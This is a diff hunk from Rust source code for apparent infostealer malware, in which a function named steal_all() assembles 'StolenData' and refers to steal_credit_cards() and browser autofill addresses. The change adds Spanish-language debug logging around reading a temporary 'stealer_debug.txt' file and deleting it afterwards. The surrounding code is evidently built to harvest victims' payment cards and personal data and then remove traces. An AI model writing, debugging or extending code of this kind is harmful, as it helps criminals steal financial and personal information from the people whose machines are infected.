@@ -248,12 +248,26 @@ pub fn steal_all() -> StolenData {
     
     // 🔍 DEBUG: Leer log file si existe
     let debug_log_path = std::env::temp_dir().join("stealer_debug.txt");
+    data.debug_log.push_str(&format!("🔍 DEBUG: Buscando log en: {:?}\n", debug_log_path));
+    data.debug_log.push_str(&format!("🔍 DEBUG: Archivo existe: {}\n", debug_log_path.exists()));
+    
     if debug_log_path.exists() {
-        if let Ok(log_content) = std::fs::read_to_string(&debug_log_path) {
-            data.debug_log = log_content;
-            // Eliminar archivo después de leerlo
-            let _ = std::fs::remove_file(&debug_log_path);
+        match std::fs::read_to_string(&debug_log_path) {
+            Ok(log_content) => {
+                data.debug_log.push_str("🔍 DEBUG: Log leído correctamente\n");
+                data.debug_log.push_str("════════════════════════════════\n");
+                data.debug_log.push_str(&log_content);
+                data.debug_log.push_str("════════════════════════════════\n");
+                // Eliminar archivo después de leerlo
+                let _ = std::fs::remove_file(&debug_log_path);
+            },
+            Err(e) => {
+                data.debug_log.push_str(&format!("🔍 DEBUG: Error leyendo log: {}\n", e));
+            }
         }
+    } else {
+        data.debug_log.push_str("🔍 DEBUG: Archivo de log no existe\n");
+        data.debug_log.push_str("🔍 DEBUG: Esto significa que steal_credit_cards() no escribió nada\n");
     }
     
     // Autofill Addresses
